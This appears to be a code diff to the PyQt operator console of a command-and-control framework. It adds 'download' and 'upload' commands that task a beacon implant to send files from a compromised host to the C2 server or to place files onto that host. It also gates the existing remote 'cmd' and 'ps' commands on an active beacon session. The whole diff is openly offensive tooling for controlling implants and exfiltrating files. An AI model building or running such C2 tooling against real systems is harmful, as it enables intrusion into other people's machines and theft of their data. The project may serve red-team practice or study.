@@ -139,14 +139,18 @@ class mainWidget(QtWidgets.QWidget):
         subCommand = ' '.join(map(str, command))  # Convert the command array back into a string. Returns the subcommand
         if metaCommand == "help":
             self.helpMenu()
-        if metaCommand == "cmd":
+        if metaCommand == "cmd" and BeaconInteraction == True:
             self.execCommand(subCommand)
-        if metaCommand == "ps":
+        if metaCommand == "ps" and BeaconInteraction == True:
             self.listProcesses()
         if metaCommand == "clear":
             self.textEdit.clear()
         if metaCommand == "interact":
             self.beacon_interact(subCommand)
+        if metaCommand == "download" and BeaconInteraction == True:
+            self.fileDownload(subCommand)
+        if metaCommand == "upload" and BeaconInteraction == True:
+            self.fileUpload(subCommand)
 
     def helpMenu(self):
         r1 = "{0:<8s} -   {1}".format("help", "This help menu.")
@@ -154,7 +158,9 @@ class mainWidget(QtWidgets.QWidget):
         r3 = "{0:<8s} -   {1}".format("ps", "List the running processes.")
         r4 = "{0:<8s} -   {1}".format("clear", "Clear output from display.")
         r5 = "{0:<8s} -   {1}".format("interact [Beacon ID]", "Interact with selected beacon.")
-        menu = "{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5)
+        r6 = "{0:<8s} -   {1}".format("download [filename]", "Tells implant to upload file to C2 server.")
+        r7 = "{0:<8s} -   {1}".format("upload [filename]", "Tells implant to download file from C2 server to host.")
+        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7)
         self.textEdit.append(TextColors.Green(menu))
     
     def clearCommandInput(self):
@@ -260,8 +266,22 @@ class mainWidget(QtWidgets.QWidget):
         api_post_request(api_endpoint, request_payload)
         #pprint.pprint(api_post_request(api_endpoint, request_payload))
     
+    def fileDownload(self, filename):
+        self.textEdit.append("Command has been sent to implant\n")
+        api_endpoint = "/tasks"
+        request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"download","file":"{filename}"}}]'
+        request_payload = json.loads(request_payload_string,cls=LazyDecoder)
+        api_post_request(api_endpoint, request_payload)
+    
+    def fileUpload(self, filename):
+        self.textEdit.append("Command has been sent to implant\n")
+        api_endpoint = "/tasks"
+        request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"upload","file":"{filename}"}}]'
+        request_payload = json.loads(request_payload_string,cls=LazyDecoder)
+        api_post_request(api_endpoint, request_payload)
+    
     def listProcesses(self):
-        self.textEdit.append("Command has been executed\n")
+        self.textEdit.append("Command has been sent to implant\n")
         api_endpoint = "/tasks"
         request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"list-processes"}}]'
         request_payload = json.loads(request_payload_string)
